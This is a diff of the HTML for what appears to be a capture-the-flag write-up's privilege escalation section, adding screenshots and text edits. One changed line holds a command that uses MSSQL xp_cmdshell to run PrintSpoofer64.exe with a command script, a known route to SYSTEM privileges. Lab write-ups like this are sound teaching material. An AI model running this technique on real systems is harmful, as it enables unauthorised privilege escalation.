@@ -773,7 +773,19 @@
 <h2 id="privilege-escalation">
     <a href="#privilege-escalation" class="header-anchor">#</a>
     Privilege Escalation
-</h2><p>We find a folder called &lsquo;SQL2019&rsquo; in the C:\ directory.</p>
+</h2><p>We don&rsquo;t have any special privileges, but we find a folder called &lsquo;SQL2019&rsquo; in the C:\ directory.</p>
+<p><img src="/p/sharethepainad/img/025.png"
+	width="997"
+	height="260"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
 <p><img src="/p/sharethepainad/img/015.png"
 	width="962"
 	height="445"
@@ -815,7 +827,7 @@
 		data-flex-basis="229px"
 	
 ></p>
-<p>We see alice.wonderland is the current user on MSSQL 2019.</p>
+<p>We see HACK\alice.wonderland is the current user on MSSQL 2019.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -969,7 +981,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlcmd -S tcp:127.0.0.1,1433 -E -Q &#34;EXEC xp_cmdshell &#39;C:\ProgramData\PrintSpoofer64.exe -c C:\programdata\do.cmd&#39;;&#34;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlcmd -S tcp:127.0.0.1,1433 -E -Q &#34;EXEC xp_cmdshell &#39;C:\programdata\PrintSpoofer64.exe -c C:\programdata\do.cmd&#39;;&#34;
 </span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
